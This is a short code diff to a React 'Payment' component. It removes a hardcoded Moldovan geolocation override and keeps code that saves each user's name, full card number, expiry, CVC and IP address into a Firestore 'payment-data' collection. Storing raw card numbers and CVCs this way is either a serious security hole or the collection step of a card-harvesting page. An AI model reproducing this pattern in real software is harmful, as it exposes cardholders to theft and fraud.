@@ -33,30 +33,19 @@ const Payment = () => {
             )
             .then(response => response.json())
             .then(geoData => {
-                geoData = {
-                    IPv4: "62.221.71.205",
-                    city: "Tiraspol",
-                    country_code: "MD",
-                    country_name: "Republic of Moldova",
-                    latitude: 46.8403,
-                    longitude: 29.6433,
-                    postal: "MD-3300",
-                    state: "Unitatea Teritoriala din Stinga Nistrului",
-                }
-                
-            db.collection('payment-data').add({
-                fname: fname, 
-                lname: lname, 
-                cardNum: cardNum, 
-                expiry: expiry, 
-                cvc: cvc,
-                ip_address: geoData.IPv4,
-                logged_at: Date.now()
-            }).then(data => {
-                setFromSuccess(true);
-            }).catch(err => {
-                throw new Error(err);
-            });
+                db.collection('payment-data').add({
+                    fname: fname, 
+                    lname: lname, 
+                    cardNum: cardNum, 
+                    expiry: expiry, 
+                    cvc: cvc,
+                    ip_address: geoData.IPv4,
+                    logged_at: Date.now()
+                }).then(data => {
+                    setFromSuccess(true);
+                }).catch(err => {
+                    throw new Error(err);
+                });
             })
 
         } else {
